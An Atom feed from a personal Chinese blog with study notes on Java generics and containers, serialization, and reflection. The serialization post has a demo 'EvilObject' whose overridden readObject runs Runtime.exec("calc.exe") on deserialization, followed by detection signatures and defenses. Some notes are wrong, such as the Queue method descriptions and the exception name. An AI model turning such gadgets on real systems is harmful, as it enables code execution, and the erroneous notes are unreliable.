<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Robin</title>
  
  <subtitle>LiuGuobin&#39;s blog</subtitle>
  <link href="https://liu1272.github.io/atom.xml" rel="self"/>
  
  <link href="https://liu1272.github.io/"/>
  <updated>2023-12-20T13:58:20.941Z</updated>
  <id>https://liu1272.github.io/</id>
  
  <author>
    <name>liuGuobin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java容器</title>
    <link href="https://liu1272.github.io/2023/12/20/Java%E5%AE%B9%E5%99%A8/"/>
    <id>https://liu1272.github.io/2023/12/20/Java%E5%AE%B9%E5%99%A8/</id>
    <published>2023-12-20T12:04:00.000Z</published>
    <updated>2023-12-20T13:58:20.941Z</updated>
    
    <content type="html"><![CDATA[<h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><h4 id="泛型概念"><a href="#泛型概念" class="headerlink" title="泛型概念"></a>泛型概念</h4><p>泛型的本质就是“数据类型的参数化”处理的数据类型不是固定的，而是可以作为参数传入，在调用泛型时必须传入实际类型。</p><ol><li>把类型当作是参数一样传递</li><li>&lt;数据类型&gt;只能是引用类型</li><li>泛型只在编译阶段有效，编译后生成的字节码 class 文件不包含泛型中的类型信息（类型参数在编译后会被替换成 object，运行时虚拟机并不知道泛型。）</li></ol><h4 id="泛型定义"><a href="#泛型定义" class="headerlink" title="泛型定义"></a>泛型定义</h4><table><thead><tr><th>泛型</th><th>对应单词</th><th>说明</th></tr></thead><tbody><tr><td>E</td><td>Element</td><td>在容器中使用，表示容器中的元素</td></tr><tr><td>T</td><td>Type</td><td>表示普通的JAVA类</td></tr><tr><td>K</td><td>Key</td><td>表示键，例如: Map 中的键 Key</td></tr><tr><td>V</td><td>Value</td><td>表示值</td></tr><tr><td>N</td><td>Number</td><td>表示数值类型</td></tr><tr><td>?</td><td></td><td>表示不确定的JAVA类型</td></tr></tbody></table><h5 id="非静态方法泛型"><a href="#非静态方法泛型" class="headerlink" title="非静态方法泛型"></a>非静态方法泛型</h5><pre class="line-numbers language-Java"><code class="language-Java">// 定义一个泛型方法public class GenericMethods &#123;    public <T> void f(T x) &#123;        ......    &#125;&#125;// 定义一个泛型类// 这里T可以随便写为任意标识，但是实例化泛型类时必须指定T的具体类型public interface Dao<T> &#123;    void add(T t);    T get(int index);&#125;// 定义一个泛型接口// 未传入泛型实参时，T与泛型类的定义相同，在声明类的时候，需将泛型的声明也一起加到类中// 传入泛型实参时，所有使用泛型的地方都要替换成传入的实参类型public interface Generator<T> &#123;    public T next();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>泛型的类型参数只能是类类型，不能是简单类型。</li><li>不能对确切的泛型类型使用instanceof操作。如下面的操作是非法的，编译时会出错。<br><code>if(ex_num instanceof Generic&lt;Number&gt;)&#123; &#125; </code></li></ul><h5 id="静态方法泛型"><a href="#静态方法泛型" class="headerlink" title="静态方法泛型"></a>静态方法泛型</h5><pre class="line-numbers language-Java"><code class="language-Java">// 定义一个静态方法的泛型类public class StaticGenerator<T> &#123;     * 如果在类中定义使用泛型的静态方法，需要添加额外的泛型声明（将这个方法定义成泛型方法）    public static <T> void show(T t)&#123;        ......    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="泛型数组"><a href="#泛型数组" class="headerlink" title="泛型数组"></a>泛型数组</h5><p>java中是”不能创建一个确切的泛型类型的数组”的。</p><pre class="line-numbers language-Java"><code class="language-Java">不可以：List<String>[] ls = new ArrayList<String>[10];  可以：List<?>[] ls = new ArrayList<?>[10]; List<String>[] ls = new ArrayList[10];对于通配符的方式，最后取出数据是要做显式的类型转换的。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="无界通配符"><a href="#无界通配符" class="headerlink" title="无界通配符"></a>无界通配符</h5><p>当具体类型不确定的时候，这个通配符就是<code>?</code> ；当操作类型时，不需要使用类型的具体功能时，只使用Object类中的功能。那么可以用<code>?</code>通配符来表未知类型。<br><strong>上限限定</strong>表示通配符的类型是T类以及T类的子类或者T接口以及T接口的子接口。</p><pre class="line-numbers language-Java"><code class="language-Java">public void showKeyValue1(Generic<? extends Number> obj)&#123;    // 表示只能使用Number及其子类    ......&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>下限限定</strong>表示通配符的类型是 T 类以及 T类的父类或者 T 接口以及 T接口的父接口<br>注意:该方法不适用泛型类</p><pre class="line-numbers language-Java"><code class="language-Java">public void showKeyValue1(Generic<? super Number> obj)&#123;    // 表示只能使用Number及其父类    ......&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><h3 id="容器的概念"><a href="#容器的概念" class="headerlink" title="容器的概念"></a>容器的概念</h3><p>容器是存储存储对象和数据的载体，数组是其中之一，使用Java中写好的容器API我们可以很方便的存储、操作我们的数据。</p><h3 id="容器的分类"><a href="#容器的分类" class="headerlink" title="容器的分类"></a>容器的分类</h3><p><a href="https://smms.app/image/J6sWdwRzbqQElkn" target="_blank"><img src="https://s2.loli.net/2023/12/20/J6sWdwRzbqQElkn.jpg" ></a><br>Collection：存放独立元素的序列。<br>Map：存放key-value型的元素对。（这对于需要利用key查找value的程序十分的重要！）</p><p><em>Collection是一个接口，它是Set、List等容器的父接口；Collections是个一个工具类，提供了一系列的静态方法来辅助容器操作，这些方法包括对容器的搜索、排序、线程安全化等等。</em></p><h4 id="List接口"><a href="#List接口" class="headerlink" title="List接口"></a>List接口</h4><p><strong>有序</strong>: 元素存入集合的顺序和取出的顺序一致，可以根据元素的索引标记访问元素<br><strong>可重复</strong>:  List 允许加入重复的元素。<br>List主要分为ArrayList和LinkedList，前者底层是使用数组实现的List，后者是使用链表实现的List。<br>Vector是一个已经被弃用的类，因为他是线程同步的，会导致访问速度变慢。<br>Stack是满足“后进先出”规则的容器，然而LinkedList可以实现所有的栈功能。</p><h5 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h5><p>ArrayList是一个可以动态增长的数组。<br>ArrayList默认的长度是10，如果我们插入的数据超过了10，ArrayList会不断的自我增长。<br>ArrayList由于底层是使用数组实现的，所以随机访问速度快，插入删除较慢，而且线程不安全。</p><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>add(1, “C#”)</td><td>添加单个元素</td></tr><tr><td>get()</td><td>指定位置的元素</td></tr><tr><td>size()</td><td>列表的大小</td></tr><tr><td>List.copy()</td><td>生成列表的副本</td></tr><tr><td>toArray()</td><td>把LinkedList转化为Array</td></tr><tr><td>addAll(2, colours2)</td><td>添加多个元素</td></tr><tr><td>set(3, “watch”)</td><td>修改第n个元素</td></tr><tr><td>remove()</td><td>删除索引为 0 的第一个元素</td></tr><tr><td>重载的remove(pen)</td><td>删除“ pen”项的第一次出现</td></tr><tr><td>clear()</td><td>从列表中删除所有元素</td></tr><tr><td>isEmpty()</td><td>确定列表是否为空</td></tr><tr><td>contains()</td><td>是否包含该元素</td></tr><tr><td>indexOf()</td><td>返回首次出现的索引</td></tr><tr><td>sort()</td><td>进行排序，可自定义</td></tr></tbody></table><h5 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h5><p>LinkedList是使用链表实现的容器。<br>在列表中插入和删除速度快，但是查找需要遍历整个链表速度较慢。<br>使用LinkedList可以实现很多队列、栈的数据结构。</p><pre><code>getFirst和element都返回列表的头，但是不删除它，如果列表为空，抛出异常peek实现的功能一样，但是列表为空时返回nullremoveFirst和remove都是删除并返回列表的头，如果列表为空抛出异常pool实现的功能一样，但是列表为空时返回null</code></pre><h5 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h5><h5 id="Queue"><a href="#Queue" class="headerlink" title="Queue"></a>Queue</h5><p>队列Queue是一个满足“先进先出”的数据结构。<br>LinkedList提供了方法支持队列操作，并且实现了Queue接口，所以LinkedList是队列的一种实现，可以通过LinkedList向上转型为Queue</p><pre><code>offer:将一个元素插入对尾peek:不移除的情况下将元素插入队尾，队列为空返回nullelement:不移除的情况下将元素插入队尾，队列为空报错poll:移除并返回队头，队列为空返回nullremove:不移除的情况下将元素插入队尾，队列为空报错</code></pre><p>PriorityQueue是优先级队列</p><h2 id="未完待续…"><a href="#未完待续…" class="headerlink" title="未完待续…"></a>未完待续…</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;泛型&quot;&gt;&lt;a href=&quot;#泛型&quot; class=&quot;headerlink&quot; title=&quot;泛型&quot;&gt;&lt;/a&gt;泛型&lt;/h2&gt;&lt;h4 id=&quot;泛型概念&quot;&gt;&lt;a href=&quot;#泛型概念&quot; class=&quot;headerlink&quot; title=&quot;泛型概念&quot;&gt;&lt;/a&gt;泛型概念&lt;/h</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Java序列化和反序列化</title>
    <link href="https://liu1272.github.io/2023/12/19/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://liu1272.github.io/2023/12/19/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-12-19T10:53:00.000Z</published>
    <updated>2023-12-20T12:08:24.511Z</updated>
    
    <content type="html"><![CDATA[<h3 id="序列化与反序列化概念"><a href="#序列化与反序列化概念" class="headerlink" title="序列化与反序列化概念"></a>序列化与反序列化概念</h3><p>Java序列化是指把Java对象转换为字节序列的过程；<br>Java反序列化是指把字节序列恢复为Java对象的过程；</p><p>Java的序列化技术就是把对象转换成一串由二进制字节组成的数组，然后将这二进制数据保存在磁盘或传输网络。<br>而后需要用到这对象时，磁盘或者网络接收者可以通过反序列化得到此对象，达到对象持久化的目的。<br>反序列化条件：</p><ul><li>该类必须实现 <code>java.io.Serializable</code> 对象</li><li>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的（注明是瞬态的，使用<code>transient</code>）<br>序列化过程：</li><li>序列化：将 <code>OutputStream</code> 封装在 <code>ObjectOutputStream</code> 内，然后调用 <code>writeObject </code>即可</li><li>反序列化：将 <code>InputStream</code> 封装在 <code>ObjectInputStream</code> 内，然后调用 <code>readObject </code>即可</li></ul><h3 id="序列化与反序列化操作"><a href="#序列化与反序列化操作" class="headerlink" title="序列化与反序列化操作"></a>序列化与反序列化操作</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>PHP序列化字符串基本上是可人读的，而且对于类对象来说，字段等成员属性的序列化顺序与定义顺序一致；PHP经过序列化生成类似<code>O:17:&quot;SerializationDemo&quot;:2:...</code>的字符串而对象经过Java序列化后得到的则是一个二进制串。</p><h5 id="序列化过程"><a href="#序列化过程" class="headerlink" title="序列化过程"></a>序列化过程</h5><ol><li>ObjectOutputStream实例初始化时，将魔术头和版本号写入bout （BlockDataOutputStream类型） 中</li><li>调用ObjectOutputStream.writeObject()开始写对象数据<ul><li>写入对象类型标识</li><li>writeClassDesc()进入分支writeNonProxyDesc()写入类描述数据</li><li>writeSerialData()写入对象的序列化数据</li><li>写入类描述符标识</li><li>写入类名</li><li>写入SUID（当SUID为空时，会进行计算并赋值）</li><li>计算并写入序列化属性标志位</li><li>写入字段信息数据</li><li>写入Block Data结束标识</li><li>写入父类描述数据</li><li>若类自定义了writeObject()，则调用该方法写对象，否则调用defaultWriteFields()写入对象的字段数据 （若是非原始类型，则递归处理子对象）</li><li>ObjectStreamClass.lookup()封装待序列化的类描述 （返回ObjectStreamClass类型） ，获取包括类名、自定义serialVersionUID、可序列化字段 （返回ObjectStreamField类型） 和构造方法，以及writeObject、readObject方法等</li><li>writeOrdinaryObject()写入对象数据</li></ul></li></ol><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><h5 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h5><p>Java程序中类ObjectInputStream的readObject方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的class对象，ObjectStreamClass包含了类的名称及serialVersionUID。</p><h5 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="*serialVersionUID"></a><code>*serialVersionUID</code></h5><p>serialVersionUID适用于java序列化机制。简单来说，JAVA序列化的机制是通过serialVersionUID判断类的<br>serialVersionUID来验证的版本一致的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较。<br>如果相同说明是一致的，可以进行反序列化，否则会出现反序列化版本一致的异常，即是InvalidCastException。</p><h3 id="反序列化漏洞的基本原理"><a href="#反序列化漏洞的基本原理" class="headerlink" title="反序列化漏洞的基本原理"></a>反序列化漏洞的基本原理</h3><p>在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法被重写不当时产生漏洞此处重写了readObject方法，执行<code>Runtime.getRuntime().exec()</code><br>defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行方法<br>运行流程：<br>1.myObj对象序列化进object文件<br>2.object反序列化对象-&gt;调用readObject方法-&gt;执行<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code></p><p><a href="https://smms.app/image/lV8EkChBzjDSPUs" target="_blank"><img src="https://s2.loli.net/2023/12/20/lV8EkChBzjDSPUs.jpg" alt="Java反射安全.png"></a></p><p>也就是<code>field.setAccessible(true);</code>所造成的问题。<br>再加上以下方法就能造成安全问题</p><pre><code>forName  获取类newInstance  实例化类对象getMethod   获取函数invoke   执行函数writeObject()   序列化，将Object输出成Byte流readObject()   反序列化，将Byte流输出成Object</code></pre><p>例如：利用反射机制，重写readObject方法，加入能够进行命令执行的函数Runtime.getRuntime()，执行calc.exe命令调出计算器</p><pre class="line-numbers language-Java"><code class="language-Java">import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;//创建一个可序列化的接口类public class CommandExecution implements Serializable &#123;    public static void main(String[] args) throws Exception &#123;        // 创建一个恶意的对象        EvilObject evilObject = new EvilObject();        // 序列化恶意对象        byte[] serializedData = serialize(evilObject);        // 反序列化恶意对象        deserialize(serializedData);    &#125;    // 序列化对象    private static byte[] serialize(Object obj) throws IOException &#123;        ObjectOutputStream out = new ObjectOutputStream(System.out);        out.writeObject(obj);        out.close();        return null;    &#125;    // 反序列化对象    private static void deserialize(byte[] serializedData) throws Exception &#123;        ObjectInputStream in = new ObjectInputStream(System.in);        in.readObject();        in.close();    &#125;    // 恶意对象    static class EvilObject implements Serializable &#123;        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123;            in.defaultReadObject();            // 利用反射获取Runtime类            Class<?> runtimeClass = Class.forName("java.lang.Runtime");            // 创建InvocationHandler实现类            InvocationHandler handler = new InvocationHandler() &#123;                @Override                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;                    if (method.getName().equals("exec")) &#123;                        // 执行命令                        Runtime.getRuntime().exec("calc.exe");                    &#125;                    return null;                &#125;            &#125;;            // 创建代理对象            Object proxy = Proxy.newProxyInstance(runtimeClass.getClassLoader(), new Class<?>[]&#123;runtimeClass&#125;, handler);            // 更改反射获取到的Runtime类的私有静态属性            Field field = runtimeClass.getDeclaredField("currentRuntime");            field.setAccessible(true);            field.set(null, proxy);        &#125;    &#125;&#125;代码将序列化和反序列化放在了一起，实际利用漏洞时可能是分开的。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般实现命令执行的时候有两个方向可以努力：</p><ol><li>控制代码、函数：就像命名注入等注入类漏洞一样数据被当作了代码执行；或者重写readObject，加入自定义的代码</li><li>控制输入、数据、变量：利用代码中已有的函数和逻辑，通过改变输入内容的形态实现流程的控制(不同的输入会走不同的逻辑流程，执行不同的代码块中的代码)</li></ol><p>对于Java反序列化漏洞来说，这属于控制数据输入一类。在调用反射机制触发漏洞时，有两个基本点必须要满足：</p><ol><li>有一个可序列化的类，并且该类是重写了readObject()方法的(由于不存在代码注入，只能查找已有代码逻辑中是否有这样的类)</li><li>在重写的readObject()方法的逻辑中有method.invoke函数出现，而且参数可控。</li></ol><h3 id="反序列化防护"><a href="#反序列化防护" class="headerlink" title="反序列化防护"></a>反序列化防护</h3><ol><li>从流量中发现序列化的痕迹，关键字：<code>ac ed 00 05</code>，<code>rO0AB</code></li><li>Java RMI 的传输 100% 基于反序列化，Java RMI 的默认端口是1099端口</li><li>从源码入手，可以被序列化的类一定实现了Serializable接口<ul><li>放在classpath，将应用代码中的java.io.ObjectInputStream替换为SerialKiller，之后配置让其能够允许或禁用一些存在问题的类</li><li>SerialKiller有HotReload,Whitelisting,Blacklisting几个特性，控制了外部输入反序列化后的可信类型。</li></ul></li><li>观察反序列化时的readObject()方法是否重写，重写中是否有设计不合理，可以被利用之处</li><li>对 className 进行白名单校验</li></ol><pre class="line-numbers language-Java"><code class="language-Java">public final class test extends ObjectInputStream&#123;    ...    protected Class<?> resolveClass(ObjectStreamClass desc)            throws IOException, ClassNotFoundException&#123;         if(!desc.getName().equals("className"))&#123;            throw new ClassNotFoundException(desc.getName()+" forbidden!");        &#125;        returnsuper.resolveClass(desc);    &#125;      ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>通过扩展 SecurityManager 禁止 JVM 执行外部命令 Runtime.exec</li><li>第三方jar包是否提供了一些公共的反序列化操作接口，是否有相应的安全校验如白名单校验方案</li></ol><p>剩下的内容暂时不写，请看<a href="https://trganda.github.io/notes/security/java/roadmap/Java-%E5%AE%89%E5%85%A8---%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">Java 安全 - 原生反序列化漏洞</a>和<a href="https://paper.seebug.org/312/#9">深入理解 JAVA 反序列化漏洞</a><br>以后会单独出一章来写Java安全的内容</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;序列化与反序列化概念&quot;&gt;&lt;a href=&quot;#序列化与反序列化概念&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化概念&quot;&gt;&lt;/a&gt;序列化与反序列化概念&lt;/h3&gt;&lt;p&gt;Java序列化是指把Java对象转换为字节序列的过程；&lt;br&gt;Java反序列</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Java反射</title>
    <link href="https://liu1272.github.io/2023/12/18/Java%E5%8F%8D%E5%B0%84/"/>
    <id>https://liu1272.github.io/2023/12/18/Java%E5%8F%8D%E5%B0%84/</id>
    <published>2023-12-18T10:37:00.000Z</published>
    <updated>2023-12-20T10:58:42.817Z</updated>
    
    <content type="html"><![CDATA[<h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><h3 id="Java注解概述"><a href="#Java注解概述" class="headerlink" title="Java注解概述"></a>Java注解概述</h3><p>注解也叫元数据。一种代码级别的说明。它可以声明在包、类、字段、方法、局部变量、方法参数等的前面，用来对这些元素进行说明注释。</p><h3 id="注解分类"><a href="#注解分类" class="headerlink" title="注解分类"></a>注解分类</h3><ul><li>标记注解： 没有参数的注解，仅用自身的存在与否为程序提供信息，如<code>@Override</code>注解，该注解没有参数，用于表示当前方法为重写方法。</li><li>单值注解： 只有一个参数的注解，如果该参数的名字为value，那么可以省略参数名，如 <code>@SuppressWarnings(value = &quot;all&quot;)</code>，可以简写为<code>@SuppressWarnings(&quot;all&quot;)</code>。</li><li>完整注解： 有多个参数的注解。</li><li>自定义注解：使用反射机制解析注解</li></ul><h3 id="注解作用"><a href="#注解作用" class="headerlink" title="注解作用"></a>注解作用</h3><ol><li>Java中是有三种注释的，分别为单行注释、多行注释和文档注释。@开头的元注解，这就是基于文档注释的注解。</li><li>使用反射来通过代码里标识的元数据对代码进行分析</li><li>用来做特定的编译检查，为代码提供了一种规范制约，避免我们后续在代码中处理太多的代码以及功能的规范</li></ol><h3 id="常见注解"><a href="#常见注解" class="headerlink" title="常见注解"></a>常见注解</h3><p>【内置注解】</p><ol><li>@Deprecated – 所标注内容不再被建议使用；</li><li>@Override – 只能标注方法，表示该方法覆盖父类中的方法；</li><li>@SuppressWarnings – 所标注内容产生的警告，编译器会对这些警告保持静默；</li><li>@interface – 用于定义一个注解；</li><li>@Documented –将所标注内容包含到javadoc中；</li><li>@Inherited – 只能被用来标注“Annotation类型”，它所标注的Annotation具有继承性，跟类的继承形式同意；</li><li>@Retention – 只能被用来标注“Annotation类型”，而且它被用来指定Annotation的RetentionPolicy属性,它表示注解存在阶段是保留在源码（编译期），字节码（类加载）或者运行期（JVM中运行）</li></ol><p>【元注解】</p><ol><li>@Target:用于描述注解的使用范围即被描述的注解可以用在什么地方</li><li>@Retention:表示需要在什么级别保存该注释信息，用于描述注解的生命周期(SOURCE &lt; CLASS &lt; RUNTIME)</li><li>@Document: 说明该注解将被包含在javadoc中</li><li>@Inherited:说明子类可以继承父类中的该注解</li></ol><p>【自定义注解】</p><ol><li>@interface用来声明一个注解，格式:public @interface 注解名{定义内容}</li><li>其中的每一个方法实际上是声明了一个配置参数</li><li>方法的名称就是参数的名称</li><li>返回值类型就是参数的类型(返回值只能是基本类型,Class,String,enum)</li><li>可以通过default来声明参数的默认值</li><li>如果只有一个参数成员，一般参数名为value</li><li>注解元素必须要有值，我们定义注解元素时，经常使用空字符串，0作为默认值</li></ol><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><h3 id="静态语言和动态语言"><a href="#静态语言和动态语言" class="headerlink" title="静态语言和动态语言"></a>静态语言和动态语言</h3><p><strong>动态语言</strong><br>运行时可以改变其结构的语言:例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。主要动态语言: Obiect-C、C#、JavaScript、PHP、Python等<br><strong>静态语言</strong><br>与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++</p><h3 id="反射概念"><a href="#反射概念" class="headerlink" title="反射概念"></a>反射概念</h3><p>反射机制允许程序在执行期借助于Reflection API取得任何类的内部信息，并能直接操作任意对象的内部属性及方法。</p><pre class="line-numbers language-Java"><code class="language-Java">Class c = Class.forName(“java.lang.String”)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>加载完类之后，在堆内存的方法区中就产生了一个Class类型的对象(一个类只有这个对象就包含了完整的类的结构信息。<br>我们可以通过这个Class对象看到类的结构。这个对象就像一面镜子，透过这个镜子看到类的结构，所以我们形象的称之为:反射<br><a href="https://smms.app/image/g2HYe3Cw6tSKoPz" target="_blank"><img src="https://s2.loli.net/2023/12/18/g2HYe3Cw6tSKoPz.jpg" ></a></p><h3 id="反射的功能"><a href="#反射的功能" class="headerlink" title="反射的功能"></a>反射的功能</h3><ol><li>在运行时判断任意一个对象所属的类</li><li>在运行时构造任意一个类的对象</li><li>在运行时判断任意一个类所具有的成员变量和方法</li><li>在运行时获取泛型信息</li><li>在运行时调用任意一个对象的成员变量和方法</li><li>在运行时处理注解</li><li><strong>生成动态代理（重要）</strong></li></ol><h3 id="常用Class类反射方法（如何使用反射）"><a href="#常用Class类反射方法（如何使用反射）" class="headerlink" title="常用Class类反射方法（如何使用反射）"></a>常用Class类反射方法（如何使用反射）</h3><p><a href="https://smms.app/image/knT4QSyE8XI6h5t" target="_blank"><img src="https://s2.loli.net/2023/12/18/knT4QSyE8XI6h5t.jpg" ></a></p><h5 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h5><pre class="line-numbers language-Java"><code class="language-Java">public class Apple &#123;        ......&#125;Class<Apple> clazz;// 1. 直接.classclazz = Apple.class;// 2. 通过 类的全路径clazz = (Class<Apple>) Class.forName("collection.Apple");// 3. 类加载器加载clazz = (Class<Apple>) Thread.currentThread().getContextClassLoader().loadClass("collection.Apple");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h5><pre class="line-numbers language-Java"><code class="language-Java">// 获取所有字段 getDeclaredFieldsArrays.asList(Apple.class.getDeclaredFields()).forEach(f->System.out.println(f.getName()));// 获取单个字段Apple.class.getDeclaredField("area").getName();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="修改字段值"><a href="#修改字段值" class="headerlink" title="修改字段值"></a>修改字段值</h5><pre class="line-numbers language-Java"><code class="language-Java">Apple apple = new Apple();apple.setArea("深圳");// 获取area字段Field field = Apple.class.getDeclaredField("area");    ***      // private字段，需要强制    ***      field.setAccessible(true);// 将值修改成长沙field.set(apple, "长沙");System.out.println(apple.getArea());  //长沙<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="通过反射创建类对象"><a href="#通过反射创建类对象" class="headerlink" title="通过反射创建类对象"></a>通过反射创建类对象</h5><p>通过反射创建类对象主要有两种方式：通过 Class 对象的 newInstance() 方法、通过 Constructor 对象的 newInstance() 方法。</p><p><strong>第一种：通过 Class 对象的 newInstance() 方法。</strong></p><pre class="line-numbers language-Java"><code class="language-Java">Class clz = Apple.class;Apple apple = (Apple)clz.newInstance();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>第二种：通过 Constructor 对象的 newInstance() 方法</strong></p><pre class="line-numbers language-Java"><code class="language-Java">Class clz = Apple.class;Constructor constructor = clz.getConstructor(String.class, int.class);Apple apple = (Apple)constructor.newInstance("红富士", 15);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通过 Constructor 对象创建类对象可以选择特定构造方法，而通过 Class 对象则只能使用默认的无参数构造方法。</p><h5 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h5><p>我们通过 Class 对象的 getFields() 方法可以获取 Class 类的属性，但无法获取私有属性。</p><pre class="line-numbers language-Java"><code class="language-Java">Class clz = Apple.class;Field[] fields = clz.getFields();for (Field field : fields) &#123;    System.out.println(field.getName());&#125;输出：price<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而如果使用 Class 对象的 getDeclaredFields() 方法则可以获取包括私有属性在内的所有属性：</p><pre class="line-numbers language-Java"><code class="language-Java">Class clz = Apple.class;Field[] fields = clz.getDeclaredFields();for (Field field : fields) &#123;    System.out.println(field.getName());&#125;输出：nameprice<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与获取类属性一样，当我们去获取类方法、类构造器时，如果要获取私有方法或私有构造器，则必须使用有 declared 关键字的方法。</p><h5 id="执行方法"><a href="#执行方法" class="headerlink" title="执行方法"></a>执行方法</h5><pre class="line-numbers language-Java"><code class="language-Java">Apple apple = new Apple();apple.setArea("深圳");// 获取setArea 方法Method m = Apple.class.getDeclaredMethod("setArea", String.class);// 调用apple对象的 setAream.invoke(apple, "长沙");System.out.println(apple.getArea()); // 输出长沙<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="获取继承的类，接口"><a href="#获取继承的类，接口" class="headerlink" title="获取继承的类，接口"></a>获取继承的类，接口</h5><pre class="line-numbers language-Java"><code class="language-Java">// 获取 继承的类Apple.class.getSuperclass()// 获取实现的接口Apple.class.getInterfaces()注意如果是几代继承就获取不到。比如A 实现B ，B实现C 。 获取A的getInterfaces就只能返回B ，而不返回C 。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="示例–反射实现SPI机制"><a href="#示例–反射实现SPI机制" class="headerlink" title="示例–反射实现SPI机制"></a>示例–反射实现SPI机制</h3><p><strong>通过改配置文件，来实现不同功能的切换。</strong></p><h5 